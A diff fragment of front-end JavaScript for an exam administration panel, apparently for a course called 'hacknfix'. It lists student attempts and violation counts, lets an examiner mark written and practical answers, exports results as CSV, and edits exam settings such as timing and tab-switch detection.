+      const t = examTotals(a);
+      const tr = document.createElement('tr');
+
+      const cell = (text, cls)=>{
+        const td = document.createElement('td');
+        if(cls) td.className = cls;
+        td.textContent = text;
+        return td;
+      };
+
+      const statusPill = document.createElement('td');
+      const sp = document.createElement('span');
+      sp.className = 'pill ' + ({in_progress:'warnp', submitted:'on', graded:'done'}[a.status] || '');
+      sp.textContent = {in_progress:'Sitting', submitted:'To mark', graded:'Marked'}[a.status] || a.status;
+      statusPill.append(sp);
+
+      const flagCell = document.createElement('td');
+      if(a.violation_count){
+        const f = document.createElement('span');
+        f.className = 'pill off';
+        f.textContent = a.violation_count + (a.auto_submitted ? ' · auto' : '');
+        flagCell.append(f);
+      }else{
+        flagCell.textContent = '—';
+      }
+
+      const act = document.createElement('td');
+      act.append(mkBtn(a.status === 'in_progress' ? 'View' : 'Mark', 'btn-ghost',
+        ()=>openExamPaper(a)));
+
+      tr.append(
+        cell(i + 1),
+        cell(s.name || '—'),
+        cell(s.student_id || '—'),
+        cell(s.batch || '—'),
+        cell(a.mcq_score + '/' + a.mcq_total),
+        cell(a.written_total   ? a.written_score   + '/' + a.written_total   : '—'),
+        cell(a.practical_total ? a.practical_score + '/' + a.practical_total : '—'),
+        cell(t.outOf ? (t.got + '/' + t.outOf + '  (' + t.pct + '%)') : '—'),
+        flagCell, statusPill,
+        cell(a.submitted_at ? fmtWhen(a.submitted_at) : '—'),
+        act
+      );
+      rows.append(tr);
+    });
+  }
+
+  // ---------------- marking one paper ----------------
+  async function openExamPaper(a){
+    const { data, error } = await sb.rpc('exam_review', {p_attempt: a.id});
+    if(error || !data) return toast(error ? error.message : 'Could not load that paper', true);
+
+    const att = data.attempt, stu = data.student;
+    const answers = data.answers || [], viols = data.violations || [];
+    const t = examTotals(att);
+
+    const back = document.createElement('div');
+    back.className = 'modal-back';
+
+    const esc = escapeHtml;
+    const violRows = viols.length
+      ? viols.map(v=>`<tr><td>${esc(fmtWhen(v.at))}</td><td><span class="pill off">${esc(v.kind)}</span></td><td>${esc(v.detail||'')}</td></tr>`).join('')
+      : '<tr><td colspan="3" style="color:var(--muted);">Nothing recorded — this paper was sat cleanly.</td></tr>';
+
+    back.innerHTML = `
+      <div class="modal modal-wide">
+        <h2>${esc(stu.name)} <span class="pill">${esc(stu.student_id)}</span></h2>
+        <p class="sub">
+          ${esc(stu.batch)} · ${esc(stu.email)} · ${esc(stu.phone)}<br>
+          Started ${esc(fmtWhen(att.started_at))}${att.submitted_at ? ' · submitted ' + esc(fmtWhen(att.submitted_at)) : ' · still sitting'}
+          ${att.auto_submitted ? ' · <strong style="color:var(--danger);">submitted automatically (' + esc(att.submit_reason||'') + ')</strong>' : ''}
+        </p>
+
+        <div class="stats" style="margin:14px 0;">
+          <div class="stat"><div class="n">${att.mcq_score}/${att.mcq_total}</div><div class="l">MCQ (auto)</div></div>
+          <div class="stat"><div class="n" id="mkWritten">${att.written_score}/${att.written_total}</div><div class="l">Written</div></div>
+          <div class="stat"><div class="n" id="mkPractical">${att.practical_score}/${att.practical_total}</div><div class="l">Practical</div></div>
+          <div class="stat"><div class="n" id="mkTotal">${t.got}/${t.outOf}</div><div class="l">Total (${t.pct}%)</div></div>
+          <div class="stat"><div class="n" style="color:${att.violation_count ? 'var(--danger)' : 'inherit'};">${att.violation_count}</div><div class="l">Violations</div></div>
+        </div>
+
+        <h3 class="sec-h">Violation log</h3>
+        <div class="table-wrap" style="margin-bottom:20px;">
+          <table><thead><tr><th>When</th><th>What</th><th>Detail</th></tr></thead>
+          <tbody>${violRows}</tbody></table>
+        </div>
+
+        <h3 class="sec-h">Answers</h3>
+        <div id="mkAnswers"></div>
+
+        <div class="field" style="margin-top:18px;">
+          <label>Note for your own records <span class="sub" style="display:inline;">(optional)</span></label>
+          <textarea id="mkNote">${esc(att.grader_note || '')}</textarea>
+        </div>
+
+        <div class="modal-actions">
+          <button class="btn btn-ghost" type="button" id="mkClose">Close</button>
+          <button class="btn btn-primary" type="button" id="mkFinalize">Finish marking</button>
+        </div>
+      </div>`;
+    $('modalHost').append(back);
+
+    const host = $('mkAnswers');
+    answers.forEach(an=>{
+      const box = document.createElement('div');
+      box.className = 'mk-ans ' + an.qtype;
+
+      const head = document.createElement('div');
+      head.className = 'mk-head';
+      const tag = document.createElement('span');
+      tag.className = 'pill ' + an.qtype;
+      tag.textContent = {mcq:'MCQ', written:'Written', practical:'Practical'}[an.qtype];
+      const pos = document.createElement('strong');
+      pos.textContent = 'Q' + an.position;
+      head.append(pos, tag);
+
+      const prompt = document.createElement('div');
+      prompt.className = 'mk-prompt';
+      prompt.textContent = an.prompt;
+
+      box.append(head, prompt);
+
+      if(an.qtype === 'mcq'){
+        const list = document.createElement('div');
+        list.className = 'mk-opts';
+        (an.options || []).forEach((o, i)=>{
+          const row = document.createElement('div');
+          const chosen = an.choice === i;
+          const right  = !!o.correct;
+          row.className = 'mk-opt' + (right ? ' right' : '') + (chosen ? ' chosen' : '');
+          row.textContent = (chosen ? '▶ ' : '   ') + o.text
+            + (right ? '   ✓ correct' : '')
+            + (chosen && !right ? '   ✗ their answer' : '');
+          list.append(row);
+        });
+        if(an.choice === null || an.choice === undefined){
+          const row = document.createElement('div');
+          row.className = 'mk-opt blank';
+          row.textContent = 'Left blank — ran out of time or skipped';
+          list.append(row);
+        }
+        const verdict = document.createElement('div');
+        verdict.className = 'mk-auto ' + (an.is_correct ? 'ok' : 'no');
+        verdict.textContent = an.is_correct
+          ? 'Marked automatically: ' + an.awarded + '/' + an.max_marks
+          : 'Marked automatically: 0/' + an.max_marks;
+        box.append(list, verdict);
+      }else{
+        if(an.model){
+          const model = document.createElement('details');
+          model.className = 'mk-model';
+          model.innerHTML = '<summary>Marking notes</summary>';
+          const p = document.createElement('p');
+          p.textContent = an.model;
+          model.append(p);
+          box.append(model);
+        }
+
+        const ans = document.createElement('div');
+        ans.className = 'mk-text' + (an.qtype === 'practical' ? ' code' : '');
+        ans.textContent = (an.text || '').trim() || '— left blank —';
+        box.append(ans);
+
+        const grade = document.createElement('div');
+        grade.className = 'mk-grade';
+
+        const mark = document.createElement('input');
+        mark.type = 'number'; mark.min = 0; mark.max = an.max_marks;
+        mark.value = an.awarded;
+        mark.className = 'mk-mark';
+
+        const outOf = document.createElement('span');
+        outOf.className = 'mk-outof';
+        outOf.textContent = '/ ' + an.max_marks;
+
+        const fb = document.createElement('input');
+        fb.type = 'text';
+        fb.placeholder = 'Feedback for the student (optional)';
+        fb.value = an.feedback || '';
+        fb.className = 'mk-fb';
+
+        const state = document.createElement('span');
+        state.className = 'mk-state' + (an.graded ? ' done' : '');
+        state.textContent = an.graded ? 'marked' : 'not marked';
+
+        const save = mkBtn('Save', 'btn-primary', async ()=>{
+          const val = Math.max(0, Math.min(parseInt(mark.value,10) || 0, an.max_marks));
+          mark.value = val;
+          const { error } = await sb.rpc('exam_grade', {
+            p_answer: an.answer_id, p_awarded: val, p_feedback: fb.value
+          });
+          if(error) return toast(error.message, true);
+          an.graded = true; an.awarded = val;
+          state.className = 'mk-state done';
+          state.textContent = 'marked';
+          refreshMarkTotals();
+          toast('Saved');
+        });
+
+        grade.append(mark, outOf, fb, save, state);
+        box.append(grade);
+      }
+
+      host.append(box);
+    });
+
+    function refreshMarkTotals(){
+      const sum = t => answers.filter(a=>a.qtype===t).reduce((s,a)=>s+(a.awarded||0), 0);
+      const max = t => answers.filter(a=>a.qtype===t).reduce((s,a)=>s+a.max_marks, 0);
+      const w = sum('written'), p = sum('practical'), m = att.mcq_score;
+      $('mkWritten').textContent   = w + '/' + max('written');
+      $('mkPractical').textContent = p + '/' + max('practical');
+      const got = m + w + p, outOf = att.mcq_total + max('written') + max('practical');
+      $('mkTotal').textContent = got + '/' + outOf;
+    }
+
+    function close(){ back.remove(); loadExamAttempts(); }
+    $('mkClose').addEventListener('click', close);
+    back.addEventListener('click', e=>{ if(e.target === back) close(); });
+
+    $('mkFinalize').addEventListener('click', async ()=>{
+      const { error } = await sb.rpc('exam_finalize', {
+        p_attempt: att.id, p_note: $('mkNote').value
+      });
+      if(error){
+        if((error.message||'').includes('ungraded_answers'))
+          return toast('Every written and practical answer needs a mark first', true);
+        return toast(error.message, true);
+      }
+      toast('Paper marked');
+      close();
+    });
+  }
+
+  // ---------------- csv ----------------
+  function exportExamCsv(){
+    const list = filteredExamAttempts();
+    if(!list.length) return toast('Nothing to export', true);
+    const head = ['Name','Student ID','Batch','Email','Phone','MCQ','MCQ total',
+                  'Written','Written total','Practical','Practical total',
+                  'Total','Percent','Status','Violations','Auto-submitted','Started','Submitted'];
+    const rows = list.map(a=>{
+      const s = a.exam_students || {}, t = examTotals(a);
+      return [s.name, s.student_id, s.batch, s.email, s.phone,
+              a.mcq_score, a.mcq_total, a.written_score, a.written_total,
+              a.practical_score, a.practical_total, t.got, t.pct + '%',
+              a.status, a.violation_count, a.auto_submitted ? 'yes' : 'no',
+              a.started_at, a.submitted_at || ''];
+    });
+    const csv = [head, ...rows]
+      .map(r => r.map(v => '"' + String(v == null ? '' : v).replace(/"/g,'""') + '"').join(','))
+      .join('\n');
+    const blob = new Blob(['﻿' + csv], {type:'text/csv;charset=utf-8;'});
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = 'hacknfix-exam-' + new Date().toISOString().slice(0,10) + '.csv';
+    a.click();
+    URL.revokeObjectURL(url);
+  }
+
+  // ---------------- settings ----------------
+  async function loadExamSettingsAdmin(){
+    const { data, error } = await sb.from('exam_settings').select('*').eq('id',1).single();
+    if(error){ examInstalled = false; return; }
+    examSettings = data;
+
+    $('exsOpen').checked           = data.exam_open;
+    $('exsMcqCount').value         = data.mcq_count;
+    $('exsWrittenCount').value     = data.written_count;
+    $('exsPracticalCount').value   = data.practical_count;
+    $('exsMcqSeconds').value       = data.mcq_seconds;
+    $('exsWrittenMinutes').value   = data.written_minutes;
+    $('exsPracticalMinutes').value = data.practical_minutes;
+    $('exsMaxViol').value          = data.max_violations;
+    $('exsPass').value             = data.pass_percent;
+    $('exsFullscreen').checked     = data.require_fullscreen;
+    $('exsBlockCopy').checked      = data.block_copy;
+    $('exsTabSwitch').checked      = data.detect_tab_switch;
+    $('exsShuffleQ').checked       = data.shuffle_questions;
+    $('exsShuffleO').checked       = data.shuffle_options;
+    $('exsOneAttempt').checked     = data.one_attempt_per_student;
+    $('exsTitle').value            = data.exam_title;
+    $('exsSub').value              = data.exam_sub;
+    $('exsRules').value            = data.exam_rules;
+    $('exsClosed').value           = data.exam_closed_msg;
+
+    paintExamTimeTotal();
+  }
+
+  // Shows the admin what the paper actually adds up to, so a 20-question
+  // MCQ section at 30s does not quietly become a 4-hour exam.
+  function paintExamTimeTotal(){
+    const n = id => parseInt($(id).value, 10) || 0;
+    const secs = n('exsMcqCount') * n('exsMcqSeconds')
+               + n('exsWrittenMinutes') * 60
+               + n('exsPracticalMinutes') * 60;
+    const h = Math.floor(secs/3600), m = Math.round((secs%3600)/60);
+    $('exsTimeTotal').textContent =
+      'Total time allowed: ' + (h ? h + 'h ' : '') + m + 'm'
+      + '  ·  MCQ section alone: ' + Math.round(n('exsMcqCount') * n('exsMcqSeconds') / 60) + 'm';
+  }
+
+  async function saveExamSettings(){
+    const n = (id, lo, hi, dflt) => {
+      const v = parseInt($(id).value, 10);
+      return isNaN(v) ? dflt : Math.max(lo, Math.min(v, hi));
+    };
+    const payload = {
+      exam_open:               $('exsOpen').checked,
+      mcq_count:               n('exsMcqCount', 0, 200, 20),
+      written_count:           n('exsWrittenCount', 0, 50, 3),
+      practical_count:         n('exsPracticalCount', 0, 50, 2),
+      mcq_seconds:             n('exsMcqSeconds', 5, 600, 30),
+      written_minutes:         n('exsWrittenMinutes', 1, 360, 30),
+      practical_minutes:       n('exsPracticalMinutes', 1, 360, 30),
+      max_violations:          n('exsMaxViol', 1, 20, 3),
+      pass_percent:            n('exsPass', 0, 100, 40),
+      require_fullscreen:      $('exsFullscreen').checked,
+      block_copy:              $('exsBlockCopy').checked,
+      detect_tab_switch:       $('exsTabSwitch').checked,
+      shuffle_questions:       $('exsShuffleQ').checked,
+      shuffle_options:         $('exsShuffleO').checked,
+      one_attempt_per_student: $('exsOneAttempt').checked,
+      exam_title:              $('exsTitle').value.trim() || 'Final Exam',
+      exam_sub:                $('exsSub').value.trim(),
+      exam_rules:              $('exsRules').value.trim(),
+      exam_closed_msg:         $('exsClosed').value.trim(),
+      updated_at:              new Date().toISOString()
+    };
+
+    const active = {mcq:0, written:0, practical:0};
+    examQuestions.forEach(q=>{ if(q.is_active) active[q.qtype]++; });
+    const short = [];
+    if(payload.mcq_count > active.mcq)             short.push(`MCQ (asking ${payload.mcq_count}, have ${active.mcq})`);
+    if(payload.written_count > active.written)     short.push(`written (asking ${payload.written_count}, have ${active.written})`);
+    if(payload.practical_count > active.practical) short.push(`practical (asking ${payload.practical_count}, have ${active.practical})`);
+    if(short.length && !confirm(
+      'You have fewer active questions than you are asking for:\n\n  ' +
+      short.join('\n  ') +
+      '\n\nStudents will simply get all of the ones you do have. Save anyway?')) return;
+
+    $('exsSaveBtn').disabled = true;
+    const { error } = await sb.from('exam_settings').update(payload).eq('id', 1);
+    $('exsSaveBtn').disabled = false;
+    if(error) return toast(error.message, true);
+    toast('Exam settings saved');
+    loadExamSettingsAdmin();
+    renderExamQuestions();
+  }
+
+  // ---------------- wiring ----------------
+  $('addExQBtn').addEventListener('click', ()=>openExamEditor(null));
+  $('exRefreshBtn').addEventListener('click', loadExamAttempts);
+  $('exCsvBtn').addEventListener('click', exportExamCsv);
+  $('exSearch').addEventListener('input', renderExamAttempts);
+  $('exFilter').addEventListener('change', renderExamAttempts);
+  $('exsSaveBtn').addEventListener('click', saveExamSettings);
+
+  ['exsMcqCount','exsMcqSeconds','exsWrittenMinutes','exsPracticalMinutes']
+    .forEach(id => $(id).addEventListener('input', paintExamTimeTotal));
+
+  document.querySelectorAll('[data-qf]').forEach(btn=>{
+    btn.addEventListener('click', ()=>{
+      examQFilter = btn.getAttribute('data-qf');
+      document.querySelectorAll('[data-qf]').forEach(b=>{
+        b.classList.toggle('btn-primary', b === btn);
+        b.classList.toggle('btn-ghost',   b !== btn);
+      });
+      renderExamQuestions();
+    });
+  });
 
   init();
 })();
